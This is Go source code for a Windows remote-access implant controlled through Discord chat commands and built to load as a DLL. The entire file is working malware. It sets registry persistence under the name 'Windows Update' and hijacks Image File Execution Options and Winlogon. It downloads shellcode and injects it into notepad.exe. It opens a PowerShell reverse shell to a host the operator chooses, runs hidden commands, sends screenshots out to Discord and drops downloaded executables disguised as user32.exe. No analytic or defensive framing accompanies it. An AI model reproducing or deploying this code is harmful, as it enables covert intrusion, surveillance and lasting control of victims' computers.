package main

import "C"

import (
	"io"
	"os"
	"net"
	"fmt"
	"time"
	"image"
	"strings"
	"strconv"
	"syscall"
	"unsafe"
	"net/http"
	"io/ioutil"
	"os/exec"
	"os/signal"
	"image/png"
	"encoding/json"
	"path/filepath"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/bwmarrin/discordgo"
	"github.com/vova616/screenshot"
	"github.com/mitchellh/go-ps"

	"github.com/google/uuid"
	
)

type shellcode struct {
	Shellcode []byte `json:"Shellcode"`
}


var DISCORD_TOKEN string = "YOUR_DISCORD_TOKEN_HERE"

var RSHELL_HOST string
var RSHELL_PORT int
var CLIENT_ID string
var ACTIVE_STATUS bool = false


func setActive(identifier string) {
	if identifier == CLIENT_ID {
		ACTIVE_STATUS = true
	}
	return
}

func setInactive(identifier string) {
	if identifier == CLIENT_ID {
		ACTIVE_STATUS = false
	}
}

func ExePath() string {
	ex, err := os.Executable()
	if err != nil {
		fmt.Println(err)
	}
	exPath := filepath.Dir(ex)
	return exPath
}

func CurrentUserPersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Windows Update", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func LocalMachinePersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Windows Update", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func ImageFileExecutionOptionsPersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Debugger", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func WinlogonHelperPersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Userinit", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func getShellcode(url string) []byte {

	shellcodeClient := http.Client{
		Timeout: time.Second * 2,
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")

	res, getErr := shellcodeClient.Do(req)
	if getErr != nil {
		fmt.Println("Error while retrieving shellcode")
		fmt.Println(err)
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, readErr := ioutil.ReadAll(res.Body)
	if readErr != nil {
		fmt.Println("Error while reading bytes")
		fmt.Println(err)
	}
	
	sc1 := shellcode{}
	jsonErr := json.Unmarshal(body, &sc1)
	if jsonErr != nil {
		fmt.Println("Error while unmarshalling the json")
		fmt.Println(err)
	}

	shellcodeBytes := sc1.Shellcode
	return shellcodeBytes
}

func downloadFile(filepath string, url string) (err error) {
	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check the server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Bad status: %s", resp.Status)
	}

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}
	return nil
}

func commandRunner(app string, arg string) {

	cmd := exec.Command(app, arg)
	_, err := cmd.Output()

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err != nil {
		fmt.Println(err.Error())
		return
	}
}

func takeSnapshot() string {
	
	img, _ := screenshot.CaptureScreen()
	myImg := image.Image(img)
	img_name := getID() + ".png"
	file, _ := os.Create(img_name)
	defer file.Close()
	png.Encode(file, myImg)
	return img_name
}

func removeFile(fileName string) {
	time.Sleep(15 * time.Second)
	err := os.Remove(fileName)
	if err != nil {
		fmt.Println("Unable to remove the file: " + fileName)
		fmt.Println(err)
		return
	}
}

func process_injection(sc []byte, process_name string) {
	pid := find_process(process_name)
	if pid == 0 {
		fmt.Println("Cannot find " + process_name + " process")
		return
	}

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	proc, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		fmt.Println(fmt.Sprintf("[!] OpenProcess(): %s", err.Error()))
		return
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil  && errVirtualAlloc.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] VirtualAllocEx(): %s", errVirtualAlloc.Error()))
		return
	}

	_,_, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] WriteProcessMemory(): %s", errWriteProcessMemory.Error()))
		return
	}
	
	op := 0
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&op)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] VirtualProtectEx(): %s", errVirtualProtectEx.Error()))
		return
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] CreateRemoteThreadEx(): %s", errCreateRemoteThreadEx.Error()))
		return
	}

	errCloseHandle := windows.CloseHandle(proc)
	if errCloseHandle != nil {
		fmt.Println(fmt.Sprintf("[!] CloseHandle(): %s", errCloseHandle.Error()))
		return
	}
}

func find_process(proc string) int {
	processList, err := ps.Processes()
	if err != nil {
		return -1
	}

	for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() != proc {
			continue
		}
		p, errOpenProcess := windows.OpenProcess(windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
		if errOpenProcess != nil {
			continue
		}
		windows.CloseHandle(p)
		return process.Pid()
	}
	return 0
}

func sendShell(remoteHost string) {
	conn, err := net.Dial("tcp", remoteHost)
	if err != nil {
		return
	}
	var cmd *exec.Cmd
	cmd = exec.Command("powershell")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func getID() string {
	id, err := uuid.NewRandom()
	if err != nil {
		fmt.Println("Could not generate unique ID using default")
		return "Juelz"
	}
	return id.String()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == "!salute" {
		s.ChannelMessageSend(m.ChannelID, "Salute! from " + CLIENT_ID)
	}

	if strings.HasPrefix(m.Content, "!set-active ") {
		id := m.Content[12:]
		setActive(id)
		if ACTIVE_STATUS == true {
			s.ChannelMessageSend(m.ChannelID, "Agent: " + id + " has been set to active status.")
		}
	}

	if strings.HasPrefix(m.Content, "!set-inactive ") {
		id := m.Content[14:]
		setInactive(id)
		if ACTIVE_STATUS == true {
			s.ChannelMessageSend(m.ChannelID, "Agent: " + id + " has been set to inactive status.")
		}
	}

	if ACTIVE_STATUS == true {
		if m.Content == "!snapshot" {
			snapshotName := takeSnapshot()
			snapshotData, err := os.OpenFile(snapshotName, os.O_RDWR, 0644)
			if err != nil {
				fmt.Println("Unable to open the specified file ", err)
			} 
			s.ChannelFileSend(m.ChannelID, snapshotName, snapshotData)
			defer snapshotData.Close()
			go removeFile(snapshotName)
		}
	
		if strings.HasPrefix(m.Content, "!exec-shellcode ") {
			u := m.Content[16:]
			s.ChannelMessageSend(m.ChannelID, "Attempting to execute shellcode located at " + u)
			se := getShellcode(u)
			go process_injection(se, "notepad.exe")
	
		}
	
		if strings.HasPrefix(m.Content, "!exec-command ") {
			comm := m.Content[14:]
			s.ChannelMessageSend(m.ChannelID, "Attempting to run your command")
			app := "cmd.exe"
			arg := fmt.Sprintf("/c %s", comm)
			go commandRunner(app, arg)
		}
	
		if strings.HasPrefix(m.Content, "!download ") {
			// For now assuming this is an exe will add filename helper functions for filename later
			fileUrl := m.Content[10:]
			username := os.Getenv("USERNAME")
			filename := "user32.exe"
			downloadPath := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\%s", username, filename)
			err := downloadFile(downloadPath, fileUrl)
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, "I was unable to successfully download the file")
			}
			s.ChannelMessageSend(m.ChannelID, "Successfully downloaded the file!")
		}
	
		if m.Content == "!persist-user" {
			s.ChannelMessageSend(m.ChannelID, "Attempting to persist to registry Current User run")
			go CurrentUserPersist()
		}

		if m.Content == "!reverse-shell" {
			if RSHELL_HOST == "" {
				s.ChannelMessageSend(m.ChannelID, "I cannot send the reverse shell because you have not set the remote host")
				return
			}
			if RSHELL_PORT == 0 {
				s.ChannelMessageSend(m.ChannelID, "I cannot send the reverse shell because you have not set the remote port")
				return
			}
			rhost := RSHELL_HOST + ":" + strconv.Itoa(RSHELL_PORT)
			s.ChannelMessageSend(m.ChannelID, "Attempting to open reverse shell to " + rhost)
			go sendShell(rhost)
	
		}
	
		if strings.HasPrefix(m.Content, "!set-rshell-host ") {
			RSHELL_HOST = m.Content[17:]
			s.ChannelMessageSend(m.ChannelID, "Reverse shell host has been updated")
		}
	
		if strings.HasPrefix(m.Content, "!set-rshell-port ") {
			pr, i_err := strconv.Atoi(m.Content[17:])
			if i_err != nil {
				s.ChannelMessageSend(m.ChannelID, "I was unable to set the port please try again")
				return
			}
			RSHELL_PORT = pr
			s.ChannelMessageSend(m.ChannelID, "Reverse shell port has been updated")
		}
	
		if m.Content == "!get-rshell-host" {
			s.ChannelMessageSend(m.ChannelID, RSHELL_HOST)
		}
	
		if m.Content == "!get-rshell-port" {
			s.ChannelMessageSend(m.ChannelID, strconv.Itoa(RSHELL_PORT))
		}
	
		if strings.HasPrefix(m.Content, "!echo ") {
			msg := m.Content[5:]
			s.ChannelMessageSend(m.ChannelID, msg)
		}


	
	}
}
	

func main() {
	CLIENT_ID = getID()
	dg, err := discordgo.New("Bot " + DISCORD_TOKEN)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}
	
	dg.AddHandler(messageCreate)

	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	//fmt.Println("Bot is now running. Press Ctrl-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}

//export DllMain
func DllMain() {
	main()
}